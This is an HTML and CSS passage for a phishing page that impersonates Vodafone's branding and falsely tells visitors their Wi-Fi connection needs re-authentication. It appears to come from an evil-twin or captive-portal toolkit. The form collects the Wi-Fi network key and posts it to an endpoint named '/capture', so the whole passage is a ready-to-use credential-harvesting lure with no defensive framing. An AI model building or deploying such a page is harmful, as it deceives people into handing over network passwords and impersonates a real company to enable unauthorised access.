<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'VodafoneRg','Helvetica Neue',Arial,sans-serif;
background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}
.header{background:#e60000;height:56px;display:flex;align-items:center}
.header-inner{max-width:900px;margin:0 auto;width:100%;padding:0 20px;
display:flex;align-items:center;justify-content:space-between}
.voda-logo{color:#fff;font-size:1.4em;font-weight:700}
.voda-logo span{display:inline-block;width:22px;height:22px;background:#fff;
border-radius:50%;margin-right:6px;vertical-align:middle;position:relative;top:-1px}
.header-right{color:rgba(255,255,255,.75);font-size:.8em}
.main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
.card{background:#fff;border-radius:4px;width:100%;max-width:400px;
box-shadow:0 2px 16px rgba(0,0,0,.1);overflow:hidden}
.card-top{background:#e60000;padding:20px 24px}
.card-top h1{color:#fff;font-size:1.1em;font-weight:700}
.card-top p{color:rgba(255,255,255,.85);font-size:.82em;margin-top:6px;line-height:1.5}
.card-mid{padding:24px}
.field{margin-bottom:18px}
label{display:block;font-size:.82em;color:#333;margin-bottom:5px;font-weight:600}
input[type=password]{width:100%;padding:11px 12px;border:1.5px solid #ddd;border-radius:4px;
font-size:.93em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#e60000;box-shadow:0 0 0 2px rgba(230,0,0,.1)}
.btn-connect{width:100%;background:#e60000;color:#fff;border:none;border-radius:4px;
padding:12px;font-size:.95em;font-weight:700;cursor:pointer;transition:background .2s}
.btn-connect:hover{background:#c00}
.card-bot{text-align:center;font-size:.7em;color:#bbb;padding:10px 16px;border-top:1px solid #f0f0f0}
</style>

<div class="header">

  </div>
</div>
<div class="main">
  <div class="card">
    <div class="card-top">
      <h1 data-i18n="title">Vodafone Wi-Fi Authentication</h1>
      <p data-i18n="sub">Your Wi-Fi connection requires re-authentication. Enter your network password to continue.</p>
    </div>
    <div class="card-mid">
      <form method="POST" action="/capture" autocomplete="off">
        <input type="hidden" name="csrf_token" value="">
        <div class="field">
          <label for="password" data-i18n="lbl_pass">Wi-Fi Network Key</label>
          <input type="password" id="password" name="password"
                 data-i18n-ph="ph_pass" placeholder="Enter Wi-Fi password"
                 required minlength="8" maxlength="63">
        </div>
        <button type="submit" class="btn-connect" data-i18n="btn">Connect</button>
      </form>
    </div>
